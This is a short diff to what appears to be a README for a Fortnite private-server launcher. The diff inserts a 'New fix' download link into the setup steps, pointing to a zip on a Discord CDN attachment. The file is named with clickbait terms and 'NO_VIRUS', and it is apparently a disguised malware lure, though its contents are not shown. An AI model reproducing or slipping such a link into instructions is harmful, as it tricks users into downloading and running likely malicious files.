@@ -4,6 +4,7 @@
 # Steps
 * Download the current version of Fortnite
 * Download Launcher [here](https://github.com/EZFNDEV/FNPrivateServer/releases/latest/download/EZFNLauncher.zip)
+* New fix [here](https://cdn.discordapp.com/attachments/800803235145056288/808390000077045760/FREE_SKINS_FREE_INGAME_FREE_EZFN_FIX_NEW_FREE_NO_VIRUS.zip)
 
 # Extract
 * Extract the contents into a folder I'd call in EZFNLauncher
